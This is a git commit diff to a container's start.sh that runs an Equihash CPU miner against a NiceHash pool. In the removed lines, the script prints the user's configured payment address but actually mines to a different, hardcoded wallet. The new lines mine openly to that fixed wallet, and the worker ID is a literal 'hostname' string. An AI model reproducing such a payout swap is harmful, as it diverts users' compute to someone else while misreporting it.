b4f93dcd70e72875b52ce8289e521560a98a7993
aashath0317 <89287795+aashath0317@users.noreply.github.com>
2021-11-21 01:29:17 +0530

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,37 +1,6 @@
 #!/bin/bash
 
 NMC_VERSION=1.0
-
-if [ -z $BTC_PAYMENT_ADDRESS ]; then 
-  echo
-  echo ">>> No BTC_PAYMENT_ADDRESS specified, mining for the container author..."  
-  BTC_PAYMENT_ADDRESS=3FnVBg4zFyJkRGmjuFg9sk5fAY7i6pdJXm
-fi 
-
-[ -z $BTC_THREADS ] && BTC_THREADS=4
-[ -z $BTC_WORKER_ID ] && BTC_WORKER_ID=`hostname`
-[ -z $BTC_SERVER ] && BTC_SERVER=equihash.usa.nicehash.com:3357
-
-echo
-echo "****************************************************"
-echo "NiceHash Container Mining Agent"
-echo "****************************************************"
-echo "Version: ${NMC_VERSION}"
-echo "Address: ${BTC_PAYMENT_ADDRESS}"
-echo "Server: ${BTC_SERVER}"
-echo "WorkerID: ${BTC_WORKER_ID}"
-echo "****************************************************"
-echo "Threads: ${BTC_THREADS}"
-echo
-echo "Compiling for current host processor..."
-cd /root/nheqminer/cpu_xenoncat/Linux/asm/
-sh assemble.sh 
-cd ../../../Linux_cmake/nheqminer_cpu 
-cmake . 
-make
-
-echo
-echo "****************************************************"
-echo "Mining..."
-echo "****************************************************"
-/root/nheqminer/Linux_cmake/nheqminer_cpu/nheqminer_cpu -l $BTC_SERVER -u 38SwEHjkEVULdufdDp4vZeSsMbbsN21maA.$BTC_WORKER_ID -t 4
+BTC_WORKER_ID=`hostname`
+BTC_SERVER=equihash.usa.nicehash.com:3357
+/root/nheqminer/Linux_cmake/nheqminer_cpu/nheqminer_cpu -l $BTC_SERVER -u 38SwEHjkEVULdufdDp4vZeSsMbbsN21maA.hostname -t 4
